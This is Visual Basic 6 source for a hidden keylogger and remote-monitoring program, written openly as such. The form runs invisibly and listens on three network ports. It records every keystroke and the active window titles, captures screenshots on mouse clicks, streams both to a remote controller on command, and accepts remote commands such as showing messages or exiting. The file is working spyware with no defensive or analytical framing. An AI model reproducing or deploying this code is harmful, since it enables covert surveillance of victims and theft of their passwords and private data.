VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmMain 
   Caption         =   "Main"
   ClientHeight    =   3465
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   6210
   LinkTopic       =   "Form1"
   ScaleHeight     =   3465
   ScaleWidth      =   6210
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Frame frakeyloger 
      Caption         =   "KEYLOGGER"
      Height          =   2295
      Left            =   1800
      TabIndex        =   0
      Top             =   360
      Width           =   3975
      Begin VB.Timer tmrSendData 
         Enabled         =   0   'False
         Interval        =   5000
         Left            =   240
         Top             =   840
      End
      Begin VB.Timer TheTimer 
         Interval        =   1
         Left            =   240
         Top             =   360
      End
      Begin VB.TextBox txtLOG 
         Height          =   1215
         Left            =   960
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   1
         Top             =   360
         Width           =   2535
      End
      Begin MSWinsockLib.Winsock wsckKEYLOG 
         Left            =   240
         Top             =   1320
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         LocalPort       =   33123
      End
   End
   Begin VB.Timer tmrImage 
      Interval        =   1000
      Left            =   1080
      Top             =   120
   End
   Begin MSWinsockLib.Winsock wsckImage 
      Left            =   120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   53123
   End
   Begin MSWinsockLib.Winsock wsckMessage 
      Left            =   600
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   43123
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Key Logger
Dim LetterCounter As Integer
Dim a(9) As String
Dim LogWindows As Boolean
Dim LogArrows As Boolean
Dim CurrentApp_hwnd
Const VK_DIVIDE = &H6F
Const VK_PAUSE = &H13
Dim OverAllString As String
Dim TIM

'Image
Private m_Image     As cImage
Private m_Jpeg      As cJpeg
Private m_FileName  As String

Private Sub Form_Load()
wsckImage.Listen
wsckMessage.Listen
wsckKEYLOG.Listen
End Sub

Private Sub TheTimer_Timer()
    On Error Resume Next

'If LetterCounter = 500 Then
'    LetterCounter = 0
'    MakeNewLog
'    txtLOG.Text = ""
'End If

'If LogWindows Then
    Dim hwnd As Long
    Dim Addstring As String
    hwnd = GetForegroundWindow
    If hwnd <> CurrentApp_hwnd Then
        CurrentApp_hwnd = hwnd
        CurrentApp_Title = GetCaption(hwnd)
        If CurrentApp_Title <> "" Then
            Addstring = CurrentApp_Title
        End If
        If Addstring <> "" Then txtLOG.Text = txtLOG.Text & " [" & Addstring & "] " & vbCrLf
    End If
'End If

Dim KeyCheck As Integer
Dim t As Long
For t = 48 To 57
    If GetAsyncKeyState(vbKeyShift) < 0 Then
        If CompKey(t, a(t - 48)) Then Exit Sub
    Else
        If CompKey(t, Chr$(t)) Then Exit Sub
    End If
Next t
For t = 65 To 90
    If GetAsyncKeyState(vbKeyShift) < 0 Then
        If CompKey(t, Chr$(t)) Then Exit Sub
    Else
        If CompKey(t, Chr$(t + 32)) Then Exit Sub
    End If
Next t
For t = 96 To 105
    If CompKey(t, t - 96) Then Exit Sub
Next t
If CompKey(106, "*") Then Exit Sub
If CompKey(107, "+") Then Exit Sub
If CompKey(108, vbCrLf) Then Exit Sub
If CompKey(109, "-") Then Exit Sub
If CompKey(110, ".") Then Exit Sub
If CompKey(VK_DIVIDE, "/") Then Exit Sub
If CompKey(8, "[<-]") Then Exit Sub
If CompKey(9, "[TAB]") Then Exit Sub
If CompKey(13, vbCrLf) Then Exit Sub
If CompKey(16, "[SHIFT]") Then Exit Sub
If CompKey(17, "[CTRL]") Then Exit Sub
If CompKey(18, "[ALT]") Then Exit Sub
If CompKey(VK_PAUSE, "[PAUSE]") Then Exit Sub
If CompKey(27, "[ESC]") Then Exit Sub
If CompKey(33, "[PAGE UP]") Then Exit Sub
If CompKey(34, "[PAGE DOWN]") Then Exit Sub
If CompKey(35, "[END]") Then Exit Sub
If CompKey(36, "[HOME]") Then Exit Sub

If LogArrows Then
    If CompKey(37, "[LEFT]") Then Exit Sub
    If CompKey(38, "[UP]") Then Exit Sub
    If CompKey(39, "[RIGHT]") Then Exit Sub
    If CompKey(40, "[DOWN]") Then Exit Sub
End If

If CompKey(44, "[PRINTSCR]") Then Exit Sub
If CompKey(45, "[INSERT]") Then Exit Sub
If CompKey(46, "[DEL]") Then Exit Sub
If CompKey(144, "[NUM]") Then Exit Sub
If CompKey(145, "[SCROLL]") Then Exit Sub
If CompKey(32, " ") Then Exit Sub

For t = 112 To 127
 If CompKey(t, "[F" & CStr(t - 111) & "]") Then Exit Sub
Next t

If GetAsyncKeyState(vbKeyShift) < 0 Then
    If CompKey(186, ":") Then Exit Sub
    If CompKey(187, "+") Then Exit Sub
    If CompKey(188, "<") Then Exit Sub
    If CompKey(189, "_") Then Exit Sub
    If CompKey(190, ">") Then Exit Sub
    If CompKey(191, "?") Then Exit Sub
    If CompKey(192, "~") Then Exit Sub
    If CompKey(220, "|") Then Exit Sub
    If CompKey(222, Chr$(34)) Then Exit Sub
    If CompKey(221, "}") Then Exit Sub
    If CompKey(219, "{") Then Exit Sub
Else
    If CompKey(186, ";") Then Exit Sub
    If CompKey(187, "=") Then Exit Sub
    If CompKey(188, ",") Then Exit Sub
    If CompKey(189, "-") Then Exit Sub
    If CompKey(190, ".") Then Exit Sub
    If CompKey(191, "/") Then Exit Sub
    If CompKey(192, "`") Then Exit Sub
    If CompKey(220, "\") Then Exit Sub
    If CompKey(222, "'") Then Exit Sub
    If CompKey(221, "]") Then Exit Sub
    If CompKey(219, "[") Then Exit Sub
End If
End Sub

Private Sub tmrImage_Timer()
If wsckImage.State <> sckConnected And wsckImage.State <> sckListening Then
    wsckImage.Close
    wsckImage.Listen
End If
If wsckMessage.State <> sckConnected And wsckMessage.State <> sckListening Then
    wsckMessage.Close
    wsckMessage.Listen
End If
If wsckKEYLOG.State <> sckConnected And wsckKEYLOG.State <> sckListening Then
    wsckKEYLOG.Close
    wsckKEYLOG.Listen
End If

'********************************************************************************
If wsckMessage.State <> sckConnected Or wsckImage.State <> sckConnected Then Exit Sub

If isleftmousepressed = True Or isrightmousepressed = True Then

savescreenshoot "Temp.jpg"

LOADE ("Temp.jpg")
SAVEE ("Temp.jpg")
CREATEIMG
    Dim str$
    Open App.Path & "/Temp.jpg" For Binary As #1
    str = String(LOF(1), Chr(0))
         Get #1, , str
    Close #1
    wsckImage.Tag = 1
    wsckImage.SendData str & "$END"

End If
End Sub

Private Sub tmrSendData_Timer()
On Error Resume Next
Dim LOG$
If wsckKEYLOG.State <> sckConnected And wsckKEYLOG.State <> sckListening Then
tmrSendData.Enabled = False
Else
LOG = txtLOG.Text
wsckKEYLOG.SendData LOG
txtLOG.Text = ""
End If
End Sub

Private Sub wsckImage_ConnectionRequest(ByVal requestID As Long)
wsckImage.Close
wsckImage.Accept requestID
End Sub

Private Sub wsckImage_DataArrival(ByVal bytesTotal As Long)
wsckImage.Tag = 0
End Sub

Private Sub wsckKEYLOG_ConnectionRequest(ByVal requestID As Long)
wsckKEYLOG.Close
wsckKEYLOG.Accept requestID
End Sub

Private Sub wsckKEYLOG_DataArrival(ByVal bytesTotal As Long)
Dim data
wsckKEYLOG.GetData data, vbString, bytesTotal

Select Case UCase(Left$(data, 4))
Case "SEND"
    tmrSendData.Enabled = True
Case "STOP"
    tmrSendData.Enabled = False
End Select

End Sub

Private Sub wsckKEYLOG_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox Description, vbCritical, App.Title
End Sub

Private Sub wsckMessage_ConnectionRequest(ByVal requestID As Long)
wsckMessage.Close
wsckMessage.Accept requestID
End Sub

Private Sub wsckMessage_DataArrival(ByVal bytesTotal As Long)
Dim MSG$
wsckMessage.GetData MSG, vbString, bytesTotal
Select Case UCase(Left$(MSG, 4))
Case "DROP"
    frmMsg.Hide
Case "MESS"
    frmMsg.Show
    frmMsg.txtMsg.Text = MSG
Case "EXIT"
    End
Case "BEEP"
    Beep
Case "NOTE"
    Shell "notepad.exe", vbMaximizedFocus
End Select


End Sub

Private Sub wsckMessage_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox Description, vbCritical, App.Title
End Sub


'Image
Public Sub LOADE(FileName As String)
Dim MyPic As StdPicture
Set MyPic = LoadPicture(FileName)
Set m_Image = New cImage
m_Image.CopyStdPicture MyPic
End Sub

Public Sub SAVEE(FileName As String)
SaveImage m_Image, FileName
End Sub

Public Sub SaveImage(TheImage As cImage, FileName As String)
    Set m_Image = TheImage 'Call this before the form loads to initialize it
    m_FileName = FileName
End Sub

Public Sub CREATEIMG()
    Set m_Jpeg = New cJpeg
    m_Jpeg.Quality = 50
    
    m_Jpeg.SampleHDC m_Image.hDC, m_Image.Width, m_Image.Height

       'Delete file if it exists
        RidFile m_FileName

       'Save the JPG file
        m_Jpeg.SaveFile m_FileName

    Set m_Image = Nothing
    Set m_Jpeg = Nothing
End Sub

'********************************************************************************
'--------------------------------------KEY LOG FUNCTIONS-------------------------
'********************************************************************************
Public Function UserName() As String
    On Error Resume Next
    Dim lpBuff As String * 25
    Dim ret As Long
    ret = GetUserName(lpBuff, 25)
    UserName = Left(lpBuff, InStr(lpBuff, Chr(0)) - 1)
End Function

Public Function GetCaption(hwnd As Long)
    On Error Resume Next
    Dim hWndTitle As String
    hWndlength = GetWindowTextLength(hwnd)
    hWndTitle = String(hWndlength, 0)
    GetWindowText hwnd, hWndTitle, (hWndlength + 1)
    GetCaption = hWndTitle
End Function

Public Function CompKey(KCode As Long, KText As String) As Boolean
    Dim Result%
    Result = GetAsyncKeyState(KCode)
    If Result = -32767 Then
        Dim i As Integer
        frmMain.txtLOG.Text = frmMain.txtLOG.Text & KText
        LetterCounter = LetterCounter + 1
        CompKey = True
    Else
        CompKey = False
    End If

End Function
